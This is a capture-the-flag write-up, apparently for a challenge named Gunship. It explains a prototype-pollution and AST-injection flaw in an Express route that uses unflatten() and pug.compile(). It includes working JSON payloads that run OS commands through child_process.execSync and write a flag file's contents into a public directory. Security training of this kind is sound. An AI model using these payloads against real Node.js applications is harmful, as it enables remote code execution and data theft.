# Gunship
![Screenshot from 2021-08-19 11-26-14](https://user-images.githubusercontent.com/87865134/130007638-508df4b1-2923-422b-9df1-7635bf7b804b.png)

## - Analysis source code
- in **router**:
```JavaScript
router.post('/api/submit', (req, res) => {
  const { artist } = unflatten(req.body);
  
  if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
	  return res.json({
		  'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
	  });
  } else {
	  return res.json({
		  'response': 'Please provide us with the full name of an existing member.'
	  });
  }
});
```
> use `unflatten()` and `pug.compile()` => maybe **AST injection**

## - Exploit:
1. Use Burpsuite to intercept request and change body data to excute code
  - payload:
  ```
  {"artist.name":"Haigh",
  "__proto__.block": {
          "type": "Text", 
          "line": "process.mainModule.require('child_process').execSync(`os-command-here`)"
      }
  }
  ```

2. Result of **os-command** isnt in response
  - To get result:
    - output to file in public directory
    - out-of-band channel
 
3. Output result to file in public directory
  - list files in current directory:
  ```
  {
    "artist.name":"Haigh",
    "__proto__.block": {
            "type": "Text", 
            "line": "process.mainModule.require('child_process').execSync(`ls > /app/static/js/out.txt`)"
        }
  }
  ```
  ![Screenshot from 2021-08-19 11-44-04](https://user-images.githubusercontent.com/87865134/130009126-d7561ff2-0225-4d59-9ad8-c67a043fc706.png)

  - read content of **flag** file:
  ```
  {
    "artist.name":"Haigh",
    "__proto__.block": {
            "type": "Text", 
            "line": "process.mainModule.require('child_process').execSync(`cat flag5pfRo > /app/static/js/out.txt`)"
        }
    }
  ```
  ![Screenshot from 2021-08-19 11-45-30](https://user-images.githubusercontent.com/87865134/130009250-cfeb2b7b-65ff-41c9-93f2-e69a955e80a8.png)

## - Description:
> ***category:*** AST injection

## - Reference:
- [Nodejs AST injection](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution#pug)
